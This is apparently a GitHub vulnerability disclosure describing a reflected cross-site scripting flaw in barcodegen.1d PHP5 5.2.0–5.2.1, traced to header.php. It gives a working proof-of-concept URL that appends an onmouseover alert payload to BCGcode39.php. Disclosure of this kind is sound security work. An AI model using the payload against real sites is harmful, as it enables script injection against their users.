# barcodegen.1d-PHP5-v5.2.0-5.2.1-Cross-Site-Scripting


Download barcodegen.1d-php5.v5.2.1 (https://www.barcodebakery.com/en/download)

![image](https://github.com/wanglingjhen/barcodegen.1d-PHP5-v5.2.0-5.2.1-Cross-Site-Scripting/blob/main/Download_code.png)

Open the files,use ['include/header.php']

![image](https://github.com/wanglingjhen/barcodegen.1d-PHP5-v5.2.0-5.2.1-Cross-Site-Scripting/blob/main/include_header.png)

Open header.php,

![image](https://github.com/wanglingjhen/barcodegen.1d-PHP5-v5.2.0-5.2.1-Cross-Site-Scripting/blob/main/header_request_uri.png)

Putting malicious payload in the end of URL. Such as [http://<vulnerable site>/barcode/html/BCGcode39.php/%22onmouseover=%22alert('test_3')%22%22]
  
![image](https://github.com/wanglingjhen/barcodegen.1d-PHP5-v5.2.0-5.2.1-Cross-Site-Scripting/blob/main/url.png)
  
succeed
  
![image](https://github.com/wanglingjhen/barcodegen.1d-PHP5-v5.2.0-5.2.1-Cross-Site-Scripting/blob/main/url_attack.png)
